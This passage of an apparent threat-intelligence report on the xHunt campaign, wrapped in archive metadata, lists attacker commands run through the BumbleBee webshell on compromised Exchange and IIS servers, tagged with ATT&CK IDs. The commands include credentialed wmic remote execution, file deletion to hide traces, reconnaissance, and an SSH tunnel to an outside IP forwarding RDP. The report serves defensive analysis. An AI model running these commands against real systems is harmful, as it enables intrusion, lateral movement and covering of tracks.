[T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:58:00 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c del\nc:\\windows\\temp\\RTQ.exe /F\"\n\n15:58:05 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c del\nc:\\windows\\temp\\RTQ.exe\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n15:58:19 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:25 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:38 dir \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n15:58:43 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:59:25 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c tasklist >\nC:\\windows\\temp\\r.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:29 type \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n15:59:48 wmic /node:\"<redacted IP #3>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c taskkill /IM \"RTQ.exe\"\n/F\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n15:59:55 dir c:\\windows\\temp\\*.exe [T1083](https://attack.mitre.org/techniques/T1083/)\n\n15:59:58 dir \\<redacted IP #3>\\C$:\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:04 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:09 del \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:14 dir \\<redacted IP #3>\\C$\\windows\\temp\\*.exe [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n-----\n\n16:00:24 del \\<redacted IP #3>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:00:29 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:02:48 powershell -c \"Test-NetConnection -ComputerName\n<redacted IP #2> -Port 80 -InformationLevel \"Detailed\"\n\n16:04:36 powershell -c \"Test-NetConnection -ComputerName\n<redacted IP #2> -Port 3389 -InformationLevel \"Detailed\"\n\n16:07:23 powershell -c \"Test-NetConnection -ComputerName\n<redacted IP #2> -Port 389 -InformationLevel \"Detailed\"\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n\n16:07:55 quser /server:<redacted IP #1> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n\n16:08:42 echo y | c:\\windows\\temp\\RTQ.exe 192.119.110[.]194 -C -R\n0.0.0.0:8081:<redacted IP #1>:3389 -l bor -pw 123321 -P\n443\n\n16:09:03 wmic /node:\"127.0.0.1\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n\n[T1572,](https://attack.mitre.org/techniques/T1572/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:09:15 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:09:35 wmic /node:\"Exchange\" /user:administrator /PASSWORD:\"\n<redacted password #2>\" process call create \"cmd.exe /c\nwhoami\"\n\n16:10:35 net use \\<redacted IP #1>\\C$ /user:<redacted domain>\\\n<redacted username #2> <redacted password #1>\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:10:45 quser /server:<redacted IP #4> [T1087](https://attack.mitre.org/techniques/T1087/)\n\n16:13:17 ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\n\n16:13:27 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c\nc:\\windows\\temp\\RTQ.exe whoami\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:14:20 type \\<redacted IP #1>\\C$\\windows\\temp\\w.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:14:30 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:14:56 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd.exe /c tasklist >\nc:\\windows\\temp\\ww.txt\"\n\n\n[T1047](https://attack.mitre.org/techniques/T1047/)\n\n\n-----\n\n16:15:28 dir \\<redacted IP #1>\\c$\\windows\\temp\\*txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:15:36 type \\<redacted IP #1>\\c$\\windows\\temp\\ww.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n\n16:17:54 powershell -c Test-NetConnection -ComputerName\n<redacted IP #1> -Port 3389\n\n16:19:28 powershell -c Test-NetConnection -ComputerName\n<redacted IP #2> -Port 3389\n\n16:19:32 wmic /node:\"<redacted IP #1>\" /user:<redacted domain>\\\n<redacted username #2> /PASSWORD:<redacted password\n#1> process call create \"cmd /c powershell -c TestNetConnection -ComputerName <redacted IP #2> -Port\n3389 > c:\\windows\\temp\\r.txt\"\n\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1059.001](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1046,](https://attack.mitre.org/techniques/T1046/)\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1021.001](https://attack.mitre.org/techniques/T1021/001/)\n\n\n16:20:00 type \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:20:34 ping -n 1 -a <redacted IP #2> [T1018](https://attack.mitre.org/techniques/T1018/)\n\n\n16:21:29 wmic /node:\"<redacted IP #2>\" /user:administrator\n/PASSWORD:\"<redacted password #2>\" process call create\n\"cmd.exe /c whoami\"\n\n16:22:06 wmic /node:\"<redacted IP #2>\" /user:administrator\n/PASSWORD:\"<redacted password #2>\" process call create\n\"cmd.exe /c whoami\"\n\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n[T1047,](https://attack.mitre.org/techniques/T1047/)\n[T1033](https://attack.mitre.org/techniques/T1033/)\n\n\n16:22:59 net use [T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:07 dir \\<redacted IP #1>\\C$\\windows\\temp\\*.txt [T1083,](https://attack.mitre.org/techniques/T1083/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:16 type \\<redacted IP #1>\\C$\\windows\\temp\\teredo.txt [T1039,](https://attack.mitre.org/techniques/T1039/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:27 del \\<redacted IP #1>\\C$\\windows\\temp\\ww.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:29 del \\<redacted IP #1>\\C$\\windows\\temp\\r.txt [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n16:23:43 net use * /DELETE /y [T1070.004,](https://attack.mitre.org/techniques/T1070/004/)\n[T1021.002](https://attack.mitre.org/techniques/T1021/002/)\n\n17:21:19 del owafont_ja.aspx /F [T1505.003,](https://attack.mitre.org/techniques/T1505/003/)\n[T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n_Table 2. Commands the actor ran using BumbleBee webshell on the compromised Exchange server._\n\n**Commands Executed via BumbleBee on IIS Web Server**\n\n\n-----\n\n**Time** **Webshell**\n**Filename**\n\n\n**Command** **ATT&CK TIDs**\n\n\n9/10/20\n20:47:36\n\n9/10/20\n20:48:03\n\n9/10/20\n20:48:20\n\n9/10/20\n20:48:29\n\n9/10/20\n20:48:33\n\n9/10/20\n20:49:19\n\n9/10/20\n20:49:27\n\n9/10/20\n20:49:35\n\n9/10/20\n20:49:44\n\n9/10/20\n20:50:16\n\n9/10/20\n20:50:21\n\n9/10/20\n20:50:40\n\n9/10/20\n20:51:16\n\n\nShowDoc.aspx hostname & whoami & ipconfig/all & route print\n& arp -a\n\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"select\n@@version;\"\"\",$conn);$ds=New-Object\nsystem.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\n\n[T1082,](https://attack.mitre.org/techniques/T1082/)\n[T1033,](https://attack.mitre.org/techniques/T1033/)\n\n[T1016](https://attack.mitre.org/techniques/T1016/)\n\n\nShowDoc.aspx ping -n 1 -a <redacted IP> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx ping -n 1 -a <redacted domain> [T1018](https://attack.mitre.org/techniques/T1018/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nShowDoc.aspx ipconfig/all [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx echo %USERDOMAIN% [T1016](https://attack.mitre.org/techniques/T1016/)\n\nShowDoc.aspx net users /domain [T1087.002](https://attack.mitre.org/techniques/T1087/002/)\n\nShowDoc.aspx net users [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\nShowDoc.aspx net localgroup administrators [T1087.001](https://attack.mitre.org/techniques/T1087/001/)\n\nShowDoc.aspx net view [T1135](https://attack.mitre.org/techniques/T1135/)\n\nShowDoc.aspx type ..\\..\\web.config [T1005](https://attack.mitre.org/techniques/T1005/)\n\nShowDoc.aspx ** Uploads cq.aspx webshell ** [T1505.003](https://attack.mitre.org/techniques/T1505/003/)\n\n\n[T1059.001,](https://attack.mitre.org/techniques/T1059/001/)\n[T1213](https://attack.mitre.org/techniques/T1213/)\n\n\n-----\n\n9/10/20\n20:51:37\n\n9/10/20\n20:51:45\n\n9/10/20\n20:52:27\n\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"\n<redacted SQL query>\"\"\",$conn);$ds=NewObject system.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\ncq.aspx powershell -C \"$conn=new-object\nSystem.Data.SqlClient.SQLConnection(\"\"\"\n<redacted SQL connection>\"\"\");Try {\n$conn.Open(); }Catch { continue; }$cmd =\nnew-object\nSystem.Data.SqlClient.SqlCommand(\"\"\"\n<redacted SQL query>\"\"\",$conn);$ds=NewObject system.Data.DataSet;$da=New-Object\nsystem.Data.SqlClient.SqlDataAdapter($cmd);\n\n[void]$da.fill($ds);$ds.Tables[0];$conn.Close();\"\n\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n[T1059.001,T1213](https://attack.mitre.org/techniques/T1059/001/)\n\n\nShowDoc.aspx del cq.aspx [T1070.004](https://attack.mitre.org/techniques/T1070/004/)\n\n\n_Table 3. Commands the actor ran using BumbleBee webshell hosted at second Kuwaiti organization._\n\n**Get updates from Palo Alto Networks!**\n\nSign up to receive the latest news, cyber threat intelligence and research from us\n\n[By submitting this form, you agree to our Terms of Use and acknowledge our Privacy](https://www.paloaltonetworks.com/legal-notices/terms-of-use)\nStatement.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2021/2021.01.11.xHunt_Campaign/xHunt%20Campaign_%20New%20BumbleBee%20Webshell%20and%20SSH%20Tunnels%20Used%20for%20Lateral%20Movement.pdf"
    ],
    "report_names": [
        "xHunt Campaign_ New BumbleBee Webshell and SSH Tunnels Used for Lateral Movement"
    ],
    "threat_actors": [
        {
            "id": "21e998eb-31c8-4281-be1d-1a5133330eb9",
            "created_at": "2023-01-06T13:46:39.14468Z",
            "updated_at": "2025-03-27T02:00:03.007083Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "Hive0081 (IBM)",
                "SectorD01 (NHSC)",
                "xHunt campaign (Palo Alto)",
                "Hunter Serpens"
            ],
            "source_name": "MISPGALAXY:COBALT KATANA",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716494,
    "ts_updated_at": 1743041764,
    "ts_creation_date": 1660549237,
    "ts_modification_date": 1660549237,
    "files": {
        "pdf": "https://archive.orkl.eu/d236226592ada17c3181d9c1eb42f6f6ca52f9bc.pdf",
        "text": "https://archive.orkl.eu/d236226592ada17c3181d9c1eb42f6f6ca52f9bc.txt",
        "img": "https://archive.orkl.eu/d236226592ada17c3181d9c1eb42f6f6ca52f9bc.jpg"
    }
}